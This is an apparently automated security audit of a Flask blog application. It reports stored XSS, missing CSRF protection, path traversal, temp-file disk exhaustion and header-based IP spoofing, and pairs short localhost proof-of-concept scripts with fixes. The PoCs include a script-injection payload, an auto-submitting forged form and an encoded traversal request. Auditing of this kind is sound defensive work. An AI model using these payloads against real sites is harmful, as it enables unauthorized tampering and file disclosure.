====

Auto Security Analysis of blog-eletrix-fr at 2026-02-28

CRITICAL - Stored Cross-Site Scripting (XSS)
The application is vulnerable to Stored XSS because it allows users (admins) to create posts containing arbitrary HTML/JavaScript, which is then rendered on the post page using the Jinja2 `|safe` filter. Furthermore, the `markdown2` library is used without sanitization, allowing HTML tags to pass through.

PoC
```python
import requests

session = requests.Session()
login_data = {'username': 'admin', 'password': 'admin'}
session.post('http://localhost:5000/login', data=login_data)

xss_payload = '<script>alert("XSS")</script>'
post_data = {
    'title': 'XSS_Test',
    'author': 'hacker',
    'tags': 'test',
    'content': f'This is a test post with XSS: {xss_payload}'
}
session.post('http://localhost:5000/create_post', data=post_data)

r = session.get('http://localhost:5000/post/XSS_Test')
if xss_payload in r.text:
    print("Stored XSS Vulnerability Confirmed!")
```

Fix
Sanitize the content before rendering it. Remove the `|safe` filter in `html/post.html` or use a library like `bleach` to sanitize the HTML output from `markdown2`.

====

CRITICAL - Missing Cross-Site Request Forgery (CSRF) Protection
The application lacks CSRF protection on all state-changing routes, including `/login`, `/create_post`, and `/upload`. An attacker could trick an authenticated admin into visiting a malicious site that submits a form to these routes, potentially creating malicious posts or uploading files on behalf of the admin.

PoC
```html
<html>
  <body>
    <form action="http://localhost:5000/create_post" method="POST">
      <input type="hidden" name="title" value="CSRF_Post" />
      <input type="hidden" name="author" value="attacker" />
      <input type="hidden" name="tags" value="csrf" />
      <input type="hidden" name="content" value="This post was created via CSRF" />
      <input type="submit" value="Click me" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

Fix
Implement CSRF protection using an extension like `Flask-WTF` or by adding CSRF tokens to all forms and verifying them on the server side.

====

MEDIUM - Path Traversal in Post Retrieval
The `/post/<name>` route uses `os.path.join` with user-controlled input (`name`) to construct a file path. Although Flask's default string converter for route parameters restricts slashes, this is a dangerous pattern that can lead to arbitrary file disclosure if the routing configuration changes or if it is exploited on systems with alternative path separators.

PoC
```python
# If the app was configured with <path:name> or on certain systems:
import requests
url = "http://localhost:5000/post/..%2fREADME"
r = requests.get(url)
# This might return the contents of the root README.md file
```

Fix
Use `werkzeug.utils.secure_filename` to sanitize the `name` parameter before using it in `os.path.join`, or validate that the resulting path is within the intended directory.

====

MEDIUM - Temporary File Leakage / Denial of Service (DoS)
In the `/upload` route, files are saved to a temporary directory before being processed by Pillow. If the file is not a valid image, Pillow raises an exception, and the code fails to delete the temporary file. This allows an attacker to fill up the server's disk space by repeatedly uploading large non-image files.

PoC
```python
import requests
# Upload a non-image file
files = {'file': ('test.txt', 'some large text content')}
requests.post('http://localhost:5000/upload', files=files)
# The file 'test.txt' will remain in the ./temp_uploads directory on the server.
```

Fix
Use a `try...finally` block to ensure that temporary files are deleted regardless of whether processing succeeds or fails.

====

LOW - IP Spoofing via CF-Real-IP Header
The application trusts the `CF-Real-IP` header to determine the user's IP address. This header can be easily spoofed by a client if the application is not behind a Cloudflare proxy that overwrites it.

PoC
```python
import requests
headers = {"CF-Real-IP": "1.3.3.7"}
r = requests.get("http://localhost:5000/", headers=headers)
# The application now believes the user's IP is 1.3.3.7
```

Fix
Only trust `CF-Real-IP` if the request is confirmed to be coming from a trusted proxy (e.g., Cloudflare's IP ranges). Otherwise, use `request.remote_addr`.

====

Summary:

| Severity | Exploit Name |
|----------|--------------|
| CRITICAL | Stored Cross-Site Scripting (XSS) |
| CRITICAL | Missing Cross-Site Request Forgery (CSRF) Protection |
| MEDIUM   | Path Traversal in Post Retrieval |
| MEDIUM   | Temporary File Leakage / Denial of Service (DoS) |
| LOW      | IP Spoofing via CF-Real-IP Header |
